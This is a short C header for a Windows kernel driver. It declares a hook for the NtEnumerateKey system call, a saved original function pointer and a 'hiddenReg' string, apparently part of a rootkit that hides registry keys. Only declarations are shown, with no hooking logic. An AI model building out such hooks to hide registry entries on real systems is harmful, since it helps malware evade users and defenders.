#ifndef __ENUMKEY_H
#define __ENUMKEY_H

#include <wdm.h>

typedef NTSTATUS (NTAPI *NtEnumerateKey_t)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

NTSTATUS NTAPI hookNtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

extern NtEnumerateKey_t origNtEnumerateKey;

#define MAX_KEYHANDLEARR 2047

extern UNICODE_STRING hiddenReg;
extern PHANDLE keyHandleArr;
extern PKSPIN_LOCK keyArrLock;

#endif //__ENUMKEY_H